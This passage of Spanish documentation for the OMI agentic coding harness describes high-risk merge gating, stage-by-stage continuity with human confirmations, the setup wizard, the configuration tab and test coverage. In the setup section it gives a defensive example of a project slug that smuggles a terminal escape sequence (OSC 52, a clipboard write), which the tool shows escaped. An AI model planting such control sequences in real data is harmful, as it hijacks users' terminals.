Límites de este corte: no se adopta un stack de PRs (con la entrada encadenada el trabajo va en un solo PR; ver [Stack de PRs](#stack-de-prs)); un comentario de GitHub sin texto no cuenta como hallazgo; Ship OMI sólo observa (`observe`): publicar o desplegar desde acá no está conectado; los probes health/version de un destino GHA no tienen verificador conectado y quedan como desconocidos; la recuperación (stop, rollback, fix-forward) la decide una persona fuera de estos comandos. Una actividad que quedó abierta en otro proceso bloquea efectos nuevos hasta reconciliarla.

### Seguridad en riesgo alto

Un cambio de riesgo alto llega a Land sólo con `land.maxRisk: high`. Ahí, si el lente de Seguridad no tiene `pass` sobre el contenido que se mergea, el merge pide el sí de la persona aunque `land.mode` diga `auto`. Cuenta como sin `pass` un `unknown`, uno sin resultado, un lente sin correr, un `pass` de un contenido anterior, un `fail` con un blocker sin aceptar y un `fail` parcial (alguna parte sin juicio) de sólo avisos, que dice «sin veredicto». Un `fail` de sólo avisos, o con todos sus blockers aceptados por una persona para ese contenido (`/omi-work accept-risk`), no saca el auto-Land. Riesgo alto es el de la receta o el del testigo de Land.

- No bloquea: Verificar, el PR draft y listo para merge siguen igual. Sólo saca el auto-Land; una decisión por política se rechaza antes del merge.
- Lo dice primero: la confirmación del merge y el resumen de listo para merge empiezan con «Seguridad sin veredicto en un cambio de riesgo alto: el merge pide tu sí». Con un blocker sin aceptar, dice «Seguridad en fail en un cambio de riesgo alto: el merge pide tu sí».
- `omi_pr_merge` no lo muestra. Corre fuera del harness y sólo lee el PR en GitHub, no el estado local del trabajo. Igual pide siempre el sí de la persona.

Ejemplo: riesgo alto, Seguridad `unknown · sin resultado` por un corte de conexión y `land.mode: auto`. `/omi-work land` marca el PR listo y pregunta «Mergear el PR #42» con ese aviso en la primera línea; sin el sí, no mergea.

### Continuidad opt-in: entrada y avance por etapa

El bloque opcional `continuity` del lifecycle configura **cuándo continuar**, no **qué efectos están autorizados**. Omitirlo conserva la parada en draft y los comandos manuales anteriores, sin cambiar hashes legacy. Si se agrega, sus cinco campos son obligatorios:

```json
"continuity": {
  "entry": "ask",
  "review": "auto",
  "fix": "auto",
  "land": "manual",
  "ship": "manual"
}
```

- `entry` controla la adopción del draft recién publicado y confirmado por este trabajo. No adopta drafts históricos al cargar. `/omi-work adopt` sigue disponible y exige confirmación humana. Con `entry: ask` hay un único sí: el de la adopción, «Habilitar Review, Land y Ship en el PR #8». Muestra el PR, la rama, el HEAD y la configuración que se fija (Review, Land, presupuesto y continuidad), y va antes de leer GitHub. Si la configuración cambia mientras espera, no se adopta.
- `review`, `fix`, `land` y `ship` controlan el siguiente paso de la cadena. `auto` lo intenta si los guardrails permiten; `ask` pide continuar; `manual` espera el comando correspondiente. El sí para continuar no reemplaza el permiso del efecto: por ejemplo, `continuity.review:auto` con `review.mode:ask` sigue preguntando antes de Review.
- La cadena sólo parte de publicación confirmada, comandos lifecycle explícitos o la verificación de una corrección. No hay timers ni efectos por restore, reload o cambio de sesión. Una confirmación o evaluación tardía del contexto anterior se descarta. Un cambio del pin de entrada no hereda el sí dado a otra configuración.

Con `ask` hay un solo sí de continuidad por etapa. Si el primer efecto de la etapa ya pide un sí humano, ese diálogo lo lleva: agrega «Continuidad en ask: al aceptar, la cadena sigue con …» y el mismo sí autoriza ese efecto y la continuidad. Si el primer efecto corre solo, porque su permiso está en `auto`, la continuidad se pregunta aparte y antes, por ejemplo «Continuidad · Review del PR #8». Nunca se saltea el sí de un efecto: los siguientes de la etapa piden el suyo, como el merge después de «listo para review». En Land con `land.mode: auto`, OMI lee antes en GitHub si el PR sigue en draft. Si una persona ya lo sacó de draft, el primer efecto es el merge: en `chichex/omi-code` la continuidad viaja en su diálogo. `auto` sigue sin conceder permisos. Si la predicción falla (por ejemplo, el pin fresco de la etapa dejó el efecto en `auto`), la continuidad se pregunta antes de ese efecto. Un no a cualquiera de esos diálogos pausa la cadena como rechazo y no ejecuta nada.

Ejemplo en `chichex/omi-code`, con todo en `ask`, Review por GitHub, el PR en draft y Ship que no aplica:

```text
/omi-work adopt → sí · Habilitar Review, Land y Ship en el PR #8
Review          → sí · Review del PR #8 (también sigue la cadena)
Land            → sí · Marcar el PR #8 listo para review (también sigue la cadena)
                → sí · Mergear el PR #8
Ship            → sí · Continuidad · Ship del PR #8
```

El push de una corrección verificada no es otra ronda y el diálogo lo dice. Con `push_pr: auto` de Foundations se pregunta «Continuidad · Publicar la corrección (push) en el PR #8». Con `push_pr: ask`, el diálogo «Push de la corrección al PR #8» lleva la continuidad.

Con `continuity.fix:auto` y `corrections.mode:auto`, los hallazgos actuales pasan por un evaluador aislado, sin tools ni conversación del implementador. Contrasta cada hallazgo con la receta aprobada y el diff íntegro; sólo habilita código si acredita alcance y riesgo bajo del grupo actual. Ese riesgo bajo lo exige sólo el evaluador: con `corrections.mode: ask` o `/omi-work fix`, el sí de la persona abre la ronda aunque la receta sea de riesgo alto, y el diálogo lo avisa (por ejemplo, «Riesgo alto de la receta (harness, permissions): tu sí autoriza la ronda igual»). Un alcance nuevo sigue sin abrir. Lo mismo vale para el fix-forward. Antes, una receta de riesgo alto no podía corregirse después del PR ni con ese sí (caso real: #93, 2026-11-25). Un texto remoto, la severidad o el riesgo declarado en la receta no bastan. Ambigüedad, fuera de alcance, human-required, respuesta inválida/error/cancelación o contexto insuficiente pausan sin abrir una ronda. La evaluación queda ligada a receta, pin, sujeto, grupo y material observado; no concede push, merge ni entrega.

Una ronda autorizada cede al agente para completar rojo→verde, commit y todos los D. Tras `verified`, el host verifica el nuevo HEAD, pide o aplica **por separado** `push_pr` de Foundations y vuelve a Review del SHA nuevo en el mismo PR. `corrections.mode:auto` nunca concede permiso de push. Los presupuestos son los existentes: por defecto 2 rondas, 12 intentos y 7200 segundos activos; agotarlos no crea otro presupuesto ni permite reintentos inciertos. El trabajo de código de una ronda ya reservada puede terminar sin reservar otro intento; publicar sigue necesitando su propia reserva.

La continuidad se detiene por manual, rechazo/cancelación, bloqueo, presupuesto, falta de hechos vigentes, fallo confirmado o resultado incierto. Para retomar se usa el comando explícito después de resolver la causa. No se vuelve a preguntar automáticamente al restaurar.

El motivo de la pausa se guarda en el estado del trabajo como un código cerrado, con la etapa y el sujeto (el HEAD) en que se tomó. Otras transiciones del trabajo no lo pisan. Se muestra en español, con el próximo paso: en el panel de progreso como aviso, una sola vez en `/omi-work status` y en el contexto del agente. Por ejemplo:

```text
Continuidad en pausa · Review está en manual: corré /omi-work review
Continuidad en pausa · Hay una operación con resultado incierto: no se repite sola; revisá en GitHub
Continuidad en pausa · La configuración vigente ya no tiene continuidad: seguí a mano con /omi-work land
Continuidad en pausa · La Review del HEAD actual no se observó en esta sesión: corré /omi-work land; relee GitHub y no repite la Review
```

La Review observada vive en la sesión que la ingirió. Restaurar, recargar o reabrir la sesión no la recrea: la cadena no encadena Land con una Review que no vio. El próximo paso sale de los hallazgos ya registrados y no gasta otro intento ni otro dispatch: sin pendientes, `/omi-work land`, que relee GitHub y exige la Review confirmada del HEAD; con pendientes, `/omi-work fix`; con uno que necesita una persona, la pausa lo dice.

Un rechazo o un error del efecto lleva un código genérico y su texto como detalle. Si el pin fresco quita la continuidad a mitad de cadena, el motivo lo dice, en vez de «manual». El motivo deja de mostrarse si cambió el sujeto o empezó otra operación después de la pausa. Se borra al empezar una corrida nueva de la cadena, al correr un comando `/omi-work adopt | review | fix | land | ship` y al adoptar el PR. Deshabilitar la continuidad o cambiar sus modos sólo controla acciones futuras: no revierte pushes, merges ni entregas remotas ya observadas. Las capacidades desconectadas siguen desconectadas.

## Setup de lo que falta

OMI detecta solo lo que falta configurar y lo corre en orden: primero la [guía de Foundations](#foundations-comandos-y-permisos-por-repo), después el [wizard del lifecycle](#onboarding-del-lifecycle). `/omi-setup`, «Configurar lo que falta» en la paleta (Ctrl K) o **s** en la [pestaña OMI](#pestaña-omi) lo corren a pedido.

| Área | Se ofrece si | No se ofrece |
|---|---|---|
| Foundations | No hay ninguna v2 aceptada, ni en la KB ni la última local: ausente, bloque inválido, o registro/bloque del formato anterior | Hay una v2 vigente; la KB está caída u offline («no disponible»); el repo no tiene producto en la KB («no aplica») |
| Lifecycle | Sin configurar, aceptado sin Ship, revisión pendiente de aceptar, sin continuidad o con una Review GHA disponible | Aceptado sin recomendaciones; inválido (pide revisión humana); KB no disponible |
| Proyecto OMI | Nunca: `omi init` vincula el repo y crea recursos en OMI. Sólo se informa | — |

Se dispara solo, sin apretar nada:

- **Al entrar al harness.** Reemplaza la oferta anterior del lifecycle.
- **Al abrir una sesión interactiva nueva** (arranque u `/new`, sin mensajes) en un repo de GitHub con la KB disponible. Espera la lectura de la KB en segundo plano y no interrumpe un turno que ya empezó. Si la charla empezó mientras leía, ya no es una sesión nueva y no abre nada. Un arranque con prompt (`omi "arreglá los 2 bugs"`) empieza con ese turno, no con el setup. Si la persona ya está escribiendo en el editor, el setup no se abre, porque toma el foco y las teclas caerían en sus opciones. Sólo avisa: «Falta configurar Foundations y el lifecycle. No abrí el setup porque estabas escribiendo. Cuando quieras: /omi-setup.»
- **Al publicar el PR draft**, si el lifecycle falta, está pendiente o no tiene continuidad: sólo el wizard del lifecycle, nunca Foundations. Guardar no adopta el draft ya publicado: OMI avisa que para seguir con ese PR hay que usar `/omi-work adopt`. Una entrada `auto` o `ask` vale desde la próxima publicación. Si se publicó un stack, el aviso no manda a adopt, porque el lifecycle no adopta stacks: «Guardar no adoptó el stack. Este trabajo se publicó como stack de 2 PRs y el lifecycle no adopta stacks. Mergealos en orden con su sí.»

Nunca offline, sin UI (print o RPC), con la KB no disponible, ni al restaurar, recargar (`/reload`), retomar (resume) o bifurcar (fork) una sesión. Una sesión que ya tiene mensajes no es nueva. Se ofrece una vez por revisión y sesión.

Al abrir una sesión nueva, cada área deja una marca en `<OMI_HOME>/agent/setup-offers` justo antes de su primera pregunta. Así otra sesión u otro proceso no repite la oferta. Verla y cerrarla con Esc la consume. Si la pregunta no llegó a mostrarse, la marca se libera y la próxima sesión nueva la vuelve a ofrecer. Por ejemplo, si la sesión se cerró antes de montar la pregunta o la UI falló. Un error de disco al marcar o al liberar falla cerrado, por ejemplo con un home de sólo lectura. El costo: esa oferta automática se pierde sin aviso. `/omi-setup` y **f** siguen funcionando.

Corre un setup a la vez. Si la persona lanza `/omi-setup` mientras la oferta de una sesión nueva todavía lee la KB, manda el comando y la oferta no abre nada. Si el setup ya está abierto, `/omi-setup` no abre otro: «Ya hay un setup abierto. Terminalo o cerralo con Esc, y volvé con /omi-setup. No se cambió nada.»

El wizard del lifecycle necesita la rama base de `origin/HEAD`. Sin ella, el disparo automático lo omite sin avisar, y `/omi-setup` dice cómo resolverlo: «corré git remote set-head origin --auto y volvé con /omi-setup».

Cada parte tiene **Más adelante**, que se guarda por revisión: Foundations en su registro local y el lifecycle en su aceptación. No se vuelve a ofrecer solo hasta que esa revisión cambie; `/omi-setup` corre también lo postergado. Un bloque de Foundations inválido es otra revisión si cambia su texto, aunque el motivo sea el mismo; editar otra parte de las perillas no la cambia. **Esc** corta el setup: no guarda nada de lo que faltaba. Guardar escribe sólo la KB y la aceptación local: no ejecuta comandos, workflows, merge ni deploy.

Cada ítem tiene un estado: `ok`, `falta`, `formato anterior`, `pendiente` (una revisión sin aceptar), `recomendado` (△, por ejemplo una Review por GitHub Actions disponible: el setup la propone), `opcional` (·, sólo informa: el proyecto OMI sin vincular), `inválido`, `no disponible`, `postergado` o `no aplica`. Sin nada para correr, `/omi-setup` muestra el diagnóstico. Ejemplo, sin login en la KB:

```text
Configuración de OMI:
? Foundations · no disponible: No se pudo leer Foundations: la KB no conectó a tiempo (sin login en /mcp, sin red o lenta).
  Revisá el login de la KB en /mcp o la red, y volvé con /omi-setup.
? Lifecycle · no disponible: No se pudo leer el lifecycle: la KB no conectó a tiempo (sin login en /mcp, sin red o lenta).
  Revisá el login de la KB en /mcp o la red.
· Proyecto OMI · opcional: Sin proyecto OMI vinculado: Ship no propone destinos OMI.
  omi init en una terminal lo vincula y crea recursos en OMI: no se corre solo.
Nada para configurar desde acá.
```

El diagnóstico es puro (`src/harness/config-doctor.ts`): usa la lectura de Foundations que la sesión ya hizo, sin otra llamada a la KB. Los slugs de `.omi/project.json` vienen del repo y los motivos, de la KB: sus controles e invisibles se muestran como `\uXXXX`, nunca como secuencias del terminal. Por ejemplo, un `organizationSlug` con `ESC ]52` se ve `acme\u001b]52;…` y no escribe el portapapeles. `/omi-setup` relee la KB y, al publicar, el lifecycle se relee para no ofrecer sobre una lectura vieja. Un lifecycle aceptado con Ship sin configurar no es «sin lifecycle»: Review y Land corren, y el ítem dice «Lifecycle aceptado sin Ship: Review y Land corren, pero la entrega no se verifica».

En la TUI, lo que falta se resuelve con `/omi-setup`, no con un comando de terminal. Lo dicen publicar sin lifecycle, `/omi-work adopt` con la configuración ausente o pendiente, `/omi-work ship` sin Ship, la línea de Ship de `/omi-work status` y las pausas de la continuidad `config-required` y `ship-unconfigured`. La pausa `ship-manual` no manda a `/omi-setup`: con Ship manual, la entrega se declara con `/omi-work ship`. Con la KB caída, el texto manda a `/mcp` o la red; con un bloque inválido, a revisar la KB o a `omi init --development` en una terminal, porque el setup no lo corre. Por ejemplo:

```text
Lifecycle sin configurar para acme/app: configuralo con /omi-setup. No se inició ningún efecto.
Lifecycle con cambios sin aceptar para acme/app: aceptalo con /omi-setup. No se inició ningún efecto.
Continuidad en pausa · Ship no está configurado: configuralo con /omi-setup y después corré /omi-work ship
Continuidad en pausa · Ship es manual y OMI no verifica la entrega: declarala con /omi-work ship
```

El agente ve lo mismo en su contexto, mientras falte algo que el setup corre, también lo postergado: «Falta configurar en este repo: Sin lifecycle: el trabajo termina en el PR draft, sin Review, Land ni Ship. Lo configura la persona con /omi-setup…». Sale del diagnóstico que ya tiene la pestaña OMI, sin leer la KB en el turno; sin la TUI interactiva no hay diagnóstico y la línea no está. El proyecto OMI sin vincular, la KB caída y un bloque inválido no aparecen.

## Onboarding del lifecycle

Al abrir la sesión, un detector lee en segundo plano los workflows, scripts, manifiestos y el vínculo `.omi/project.json` del checkout. Sólo lee: no ejecuta scripts ni copia comandos, URLs o secretos.

El detector marca un workflow como Review `omi-review-v1` sólo si tiene todos los marcadores que exige el runtime: los inputs `expected_head_sha` y `correlation_id` bajo `on.workflow_dispatch.inputs` (un `workflow_dispatch` comentado o una clave con ese nombre en un step no cuentan), un `run-name` con `omi-review-v1 PR #`, `inputs.pr` e `inputs.correlation_id`, y el artefacto `omi-review-v1-${{ inputs.correlation_id }}-${{ github.run_id }}-${{ github.run_attempt }}` con `review.json`. En este repo lo cumple `claude-review.yml`. Es una propuesta: el runtime igual valida run, artefacto y SHA. Un workflow de Review nunca se propone como destino de Ship.

El [setup](#setup-de-lo-que-falta) ofrece el mismo wizard que `omi init --development` si el repo no tiene lifecycle en la KB, si tiene Ship sin configurar, si la revisión está pendiente de aceptar o si hay **recomendaciones**:

- `continuity` ausente: «Continuidad sin configurar: el trabajo para en el PR draft».
- Un workflow `omi-review-v1` detectado mientras la Review es local (o no hay config): propone pasarla a GitHub Actions.

No aparece en consultas simples ni en needs-info, que siguen en el chat. Se ofrece una vez por revisión de la configuración y sesión.

`/omi-setup` no repregunta lo que el bloque de la KB ya resuelve: por ejemplo, con Ship y continuidad configurados sólo propone la Review GHA. Sin bloque no hay nada resuelto: recorre todas las etapas, como `omi init --development`, haya o no recomendaciones.

El wizard pregunta, en orden:

1. **Ship.** Con una config válida, **Mantener Ship actual** va primero y conserva los destinos tal cual (rollback, probes, timeouts), sin reingresarlos. **Configurar ahora** propone destino, verificación y recuperación con lo detectado. **Más adelante** posterga esa revisión: no se vuelve a ofrecer hasta que cambie. **Este repo no necesita Ship** lo guarda como no-aplica.
2. **Review.** Opciones: «Mantener <actual>», «GitHub Actions · <workflow> (omi-review-v1)» por cada workflow detectado y «Revisor local». GitHub Actions va primero (recomendada) si hoy revisa el local o no hay config; si no, mantener va primero. Sin alternativa real (por ejemplo, revisor local y nada detectado) no pregunta. Elegir GitHub Actions guarda la identidad del esquema y suma una sola pregunta de modelo: **Default del workflow** (recomendada: no fija `model`) o **Sonnet** (`model: claude-sonnet-5-5`). La pregunta sale sólo si el `workflow_dispatch` declara el input `model` y acepta Sonnet (un `string`, o un `choice` con ese valor): fijar un input que el workflow no declara hace fallar el dispatch. Un workflow que exige `model` o `effort` sin `default` no se propone: el wizard puede no fijarlos y GitHub rechazaría el dispatch. Si ya había un `effort` para ese workflow, se conserva sólo si el workflow lo declara y acepta ese valor. Cambiar el proveedor no cambia `review.mode`.
3. **Continuidad**, como en [Continuidad opt-in](#continuidad-opt-in-entrada-y-avance-por-etapa).
4. **Resumen** con el diff por campo, una línea `Review: …` con el modelo efectivo y las recomendaciones sin tomar. Guarda sólo con un sí.

```json
"provider": { "kind": "gha", "workflow": "claude-review.yml", "ref": "main", "contract": "omi-review-v1", "model": "claude-sonnet-5-5" }
```

`ref` es la base de Land, la rama de donde el runtime toma el workflow. El detector lee el checkout, así que la opción lo avisa: el workflow tiene que estar en esa rama, no sólo en la del trabajo. `model` y `effort` son opcionales y aceptan los valores del workflow (`claude-opus-5-5`, `claude-sonnet-5-5`, `claude-fable-5-1`, `claude-haiku-4-5`; `low` a `max`). Omitirlos no cambia el hash de una config existente. En `chichex/omi-code` el dispatch sigue pidiendo un sí, aunque `review.mode` sea `auto`.

Guardar sin tomar una recomendación también posterga esa revisión: el harness no insiste. Si la KB no tiene el bloque, el resumen pregunta «La KB no tiene el lifecycle. ¿Lo creás con esta configuración y la aceptás?», también con una aceptación anterior en esta máquina: el diff contra esa aceptación puede parecer «sin cambios» aunque Guardar cree el bloque. `omi init --development` y `/omi-setup` preguntan siempre. **Esc** cancela sin escribir, aceptar ni desactivar nada.

## `omi init --development`

Configura Review, Land y Ship del repo y su continuidad opcional en las perillas del producto en la KB, con el mismo wizard de la TUI. Necesita una persona en una terminal interactiva; ningún flag acepta por ella.

```sh
omi init --development                 # wizard: Ship, Review, continuidad, resumen y un sí
omi init --development --check --json  # diagnóstico de sólo lectura
```

`--check` informa el estado (`unconfigured`, `pending`, `configured`, `manual`, `not-applicable`, `invalid` o `unavailable`), si se pueden iniciar efectos, lo detectado (cada workflow con su `contract`: `omi-review-v1` o `null`; uno de Review trae en `tuning` los `model` y `effort` que acepta y, en `required`, los que exige sin default) y las recomendaciones. Ejemplo: `"recommendations": [{ "kind": "continuity", "message": "Continuidad sin configurar: el trabajo para en el PR draft" }]`. Sin `--json`, cada una sale como `Recomendación: …`. Una KB caída es `unavailable`, nunca «sin configurar». Guardar no ejecuta workflows, merge ni deploy.

## Pestaña OMI

La pestaña **5 · OMI** (Ctrl 5 o `/omi-platform`) muestra toda la configuración a la vista, en vertical, sin apretar nada. Pedido del dueño (2026-11-23). Las secciones, en orden:

| Sección | Qué muestra |
|---|---|
| Proyecto OMI | El vínculo `.omi/project.json`, servicios y ambientes, como antes |
| Foundations | Origen y revisión; cada política en su línea con lo que hace en `ask` o `auto`; todos los patrones de confirmación, uno por línea; el aviso de la sesión y el motivo, por ejemplo el formato anterior o la KB caída |
| Lifecycle | Estado (`configurado`, `pendiente de aceptar`, `sin configurar`, `no disponible`, `inválido`, más `postergado`; aceptado sin Ship es `configurado · … · Ship sin configurar`); Review con proveedor (revisor local, reviews de GitHub o `workflow@ref` con modelo) y espera; correcciones con modo y rondas; Land con modo, base, método, riesgo máximo y checks requeridos; Ship con estado y cada destino campo por campo: proveedor, modo, qué hace si falla y con qué modo (`si falla: rollback (auto)`), espera, reintentos, workflow de rollback y lo que verifica (release con tag, assets y checksums, recibo, OMI, health y versión); presupuesto |
| Continuidad | Las cinco palancas con lo que hace cada modo, o «Deshabilitada: el trabajo para en el PR draft» |
| Falta configurar | El diagnóstico del [setup](#setup-de-lo-que-falta), cada ítem con cómo resolverlo, o «Todo configurado» |

Teclas: **r** actualiza el proyecto OMI y relee la configuración de la KB; **s** corre `/omi-setup`; **f** abre la guía de Foundations; **Esc** vuelve al chat. Las flechas, PgUp/PgDn, Home y la rueda desplazan la vista.

Un recorte a 80 columnas en `acme/app`, sin Foundations ni lifecycle (`…` marca lo omitido):

```text
 FOUNDATIONS · cuándo te pide confirmación el agente
 Origen: por defecto (sin configurar: nada pregunta)
 Se fija en esta sesión al empezar un trabajo.
 Arranque: auto. Crea el issue, el worktree y la sesión sin preguntar, con el
   texto del agente.
 …
 Patrones que requieren confirmación:
   (sin configurar: nada pregunta)
 Motivo: Sin Foundations para acme/app: rige el default, nada pregunta.

 LIFECYCLE · Review · Land · Ship
 Estado: sin configurar · el trabajo termina en el PR draft, sin Review, Land
   ni Ship

 CONTINUIDAD · cómo sigue después del PR draft
 Deshabilitada: el trabajo para en el PR draft.

 FALTA CONFIGURAR · hace 4s
 ✗ Foundations · falta: Sin Foundations para acme/app: rige el default, nada
   pregunta.
   Con /omi-setup armás las reglas y políticas; sólo Guardar escribe.
 …
```

De dónde salen los datos:

- La pestaña vive en otra extensión: el harness calcula la configuración y la publica por `pi.events` (`omi:config`). La pestaña sólo la lee; dibujar no hace I/O.
- Al abrir la sesión usa la lectura de Foundations que la sesión ya hizo: no suma llamadas a la KB. **r** relee la KB. Después de guardar desde el setup también se relee; después de guardar Foundations, se usa lo guardado.
- Foundations muestra el pin de la sesión con «Vigente en esta sesión». Si todavía no se fijó, muestra lo que va a regir con «Se fija en esta sesión al empezar un trabajo»: la v2 de la KB, la última aceptada en esta máquina o el default. Si la KB ya tiene otra revisión, lo dice: vale desde la próxima sesión.
- Con la KB caída, el lifecycle muestra la última aceptación local, rotulada «sólo para observar, no inicia efectos».
- Sin datos lo dice con el motivo: sin sesión persistente, leyendo, o la lectura falló. Si falla una relectura, se ve la anterior con el error.
- Sólo con la TUI interactiva; offline, **r** no consulta la KB.

Las líneas largas se parten al ancho y conservan la sangría: nada se corta a 80 ni a 132 columnas.

## Progreso en la TUI

`PROGRESO · #N` muestra ruta, etapa, actividad, pasos, checks observados y bloqueos. Con el lifecycle habilitado, el recorrido suma Review del PR, Land, Ship y Entrega verificada, y una sección **Review · Land · Ship** con presupuesto (intentos, rondas, tiempo activo), Review, checks del SHA actual, hallazgos, merge, cada destino Ship y bloqueos; la lateral resume hallazgos, rondas e intentos en una línea. `/omi-work status` muestra lo mismo. Un trabajo que terminó en PR draft sin lifecycle sigue como **PR draft abierto** y avisa que no hubo Review, Land ni Ship. El detalle muestra también Foundations: revisión, origen, tres políticas y patrones de confirmación verticales. En Implementar, Verificar y Abrir PR draft dice además la vuelta, con la misma cuenta del reducer: «Etapa: Verificar · active · vuelta 2 de 3 · queda 1 retry · amends 2 de 2». Mientras espera el turno de checks, la actividad dice a quién espera. Los eventos de lectura, comandos, preguntas y lentes actualizan la actividad sin esperar el refresco de recursos. El detalle incluye preguntas, evidencia, lentes e intentos anteriores. No convierte una tool exitosa ni un workflow verde de Actions en aprobación del PR.

El recorrido usa el catálogo de fases del harness y sus decisiones reales de ruta, no una lista paralela del renderer. Incluye pendientes, fases condicionales (Diagnóstico/Spec antes de conocer la ruta), no aplicables y los finales alternativos PR draft abierto/cierre sin cambio. `>` identifica la actual; los símbolos y textos distinguen avance sin depender del color. Un rojo esperado no hace fallar Implementar; los checks fallidos o interrumpidos conservan su significado observado. Un aviso de lente marca Verificar como △ **Con avisos**, durante la etapa y después de cumplida; sólo un blocker de Seguridad sin aceptar la marca como fallida. La lateral muestra cuántos avisos hay y la pantalla 6 y `/omi-progress` los listan, uno por lente. La sección del issue trae **Avisos de los lentes** y el PR draft los lleva en **Advertencias**, con el estado de cada lente pedido y sus hallazgos.

**6 · Progreso**, por Ctrl 6, pestaña/clic, paleta o `/omi-workflow`, muestra el recorrido completo y separa **Previsto** de **Real**. Usa desplazamiento de la vista de sólo lectura (flechas, PgUp/PgDn, Home/End y rueda) y Esc vuelve a Chat. La lateral muestra las etapas cuando entran todas, nunca una lista parcial que oculte la actual; en panes bajos mantiene su resumen, bloqueos, contadores y los otros bloques, con acceso indicado a la pantalla 6, sin scroll lateral. `/omi-progress` conserva el detalle.

La receta sólo prevé el ejecutor de Implementar. El modo real se observa desde tools ejecutadas en la sesión principal y tareas efectivamente iniciadas, no desde consultas status/result/cancel ni lotes sólo en cola. Se admite combinación inline/subagente; los lentes de Verificar se rotulan como llamadas aisladas, sin inventar una llamada a la tool subagent. No se afirma exclusividad ni éxito de una tarea por conocer su modo. Los metadatos durables son booleanos acotados por fase/vuelta, sin tareas, prompts ni outputs privados. Los estados anteriores siguen legibles con modo «sin observar»; restaurar no vuelve a lanzar jobs. Refresh los invalida y los eventos tardíos no acreditan otro pedido/vuelta.

El panel sólo pertenece al cwd/worktree/rama correctos, se reinicia al cambiar de sesión/árbol y prioriza bloqueos en panes bajos. Reemplaza el bloque Issue activo mientras hay un trabajo y respeta su visibilidad en Personalizar lateral; conserva Sesión, recursos y las demás preferencias. Usa el mismo renderer, temas y modales del workspace, sin otra interfaz web.

## Verificación del cambio

El arranque tiene sus propios tests, con Git, worktrees y sesiones reales y con GitHub y modelo falsos: pedido nuevo sin preguntar por defecto y con un solo sí con `arranque: ask`, issue existente sin duplicar, decir que no, token de un solo uso, guardas sin efectos y recarga sin kickoff. Los tests de pty real recorren el panel de issue existente y los tres resultados del pedido nuevo: harness, chat y falta de información. El del panel: Enter en Issues, el sí, Esc en la clasificación y el harness arrancado en el worktree. El del agente: un pedido en el chat, la tool, un turno que termina sin seguir, clasificar antes de crear el issue y antes del sí, reutilizar ese resultado y arrancar el harness en el worktree sólo después de confirmar. Los otros dos resultados continúan en el chat original sin recursos, con las tools normales y sin permisos nuevos. Los lentes tienen tests con Git real: la evidencia que reciben, los avisos que no frenan el PR draft, el bloqueo por un fail de Seguridad y un diff de más de 200.000 caracteres revisado por partes sin truncar, y ninguna llamada por encima del presupuesto, con la evidencia resumida y explícita cuando no entra. Land tiene tests de Seguridad en riesgo alto: `unknown`, sin resultado, sin correr o de otro contenido sacan el auto-Land con el motivo primero, rechazan una decisión por política y aparecen en la primera línea de la confirmación del merge; un `pass` del contenido o el riesgo bajo no cambian nada. El reintento tiene tests con un modelo falso con guion: un transitorio y después un resultado da pass con el uso sumado; tres errores dan `unknown` sin resultado con la causa y sin el error crudo; cuota, autenticación, un `unknown` juzgado y el abort de la persona (durante la llamada o el backoff) no se reintentan; un cuelgue se corta por el plazo, aunque el proveedor ignore el abort; y el refuter no recibe lo que quedó sin resultado. Los tests del flujo cubren las tres rutas con Git y comandos reales en repos temporales, modelos/GitHub falsos, consentimientos, invalidación, evidencia, recuperación, concurrencia, cancelación y panel estrecho/claro/oscuro. El cuerpo del PR draft tiene cobertura de su formato, de un único `Closes` fuera de bloques con datos hostiles (cierres falsos, menciones, HTML, `</details>`, marcadores, controles), de los presupuestos con aviso, del cuerpo exacto que recibe `gh` y se muestra antes del sí, y del recibo pendiente de un cuerpo anterior con `ask` y con `auto`. La sección del issue tiene cobertura del pedido byte a byte, marcadores rotos, contraste que la ignora, escape de contenido hostil (sin links, imágenes, autolinks, HTML ni menciones activos) y escrituras no confirmadas. El stack tiene tests del reducer (agrupación, plan de ramas y bases, PRs abiertos, actualización sin cambiar la identidad), de la publicación contra un GitHub falso (orden, bases, `Refs`/`Closes`, recuperación sin duplicar y validaciones por PR), de la actualización con Git real contra un remoto bare local (merge del de abajo, squash a `main` sin conflicto, re-apuntar, segunda corrida sin cambios, conflicto, PR cerrado y rama reescrita) y un recorrido completo con dos PRs encadenados. Los acuerdos del chat, de citas aceptadas y rechazadas (modelo, tools, mensajes de OMI, inventadas y triviales). Las preguntas en tanda tienen tests del componente (lo que dibuja y cada tecla, también respuesta libre, elección múltiple, pestañas y cancelar), del contrato de `omi_ask` (esquema, sin UI, cancelar, opción frente a texto libre y el harness) y un PTY real que abre una tanda dentro del workspace, con resize y Esc. La guía de Foundations tiene tests de sus pantallas con el componente de preguntas: precarga v2 frente a aceptación, aviso sin bloque en la KB, regla inválida que conserva el texto, cancelar antes o en el resumen, lista vacía y espera de lectura. Su integración usa Git temporal y KB falsa: apertura sin escrituras, reemplazo v1 acotado, edición sin ejecución/grant y reintento explícito. Los tests de persistencia cubren retry concurrente, límite de documento, aceptación pendiente frente a pin nuevo y fallos parciales sin permisos falsos. Los del setup verifican que al arrancar el harness o una sesión nueva sin Foundations se ofrece una vez, que no se abre con texto en el editor, con un prompt de arranque ni en una charla que empezó durante la lectura, que **Más adelante** persiste por revisión y Esc no escribe, que el formato anterior se avisa como tal, que publicar sin continuidad ofrece el wizard sin adoptar el draft, que la oferta de una sesión nueva y `/omi-setup` no abren dos setups a la vez, y que no se ofrece en resume, reload, fork, offline, sin UI ni con la KB caída. El diagnóstico tiene tests de un lifecycle aceptado sin Ship, que no se confunde con uno ausente, y de controles de terminal en `.omi/project.json` y en los motivos de la KB, que llegan escapados a `/omi-setup`. La integración de áreas tiene tests de los textos que mandan a `/omi-setup` (publicar sin lifecycle, `/omi-work adopt` y `/omi-work status`) y de la guía al agente: la línea está mientras falta algo y se va al configurarlo. La [pestaña OMI](#pestaña-omi) tiene tests del presenter a 132, 80 y 40 columnas (cada sección, los estados del lifecycle, el formato anterior, sin datos y sin cortes) y del harness que la publica: al abrir la sesión, con **r**, después de `/omi-setup`, sin UI y offline. Son de renderer, no una evaluación visual humana. Foundations tiene tests con un MCP falso por HTTP y el `createMcpExtension` real de Pi, que fallan si un bump de Pi cambia cómo se registran o ejecutan las tools MCP o cómo se reemplaza `builtin:mcp`; y cuentan los avisos de aceptación, reutilización de permisos, cambio de etiqueta, `resume`, `replan`, rechazo, KB caída y bloque inválido o ajeno. La aprobación tiene cobertura específica de documento íntegro, comandos largos/multilínea y caracteres de control, navegación/resize/temas, decisiones negativas y revalidación durante la revisión. Una prueba con Pi en PTY real recorre 80×24, resize a 132×40 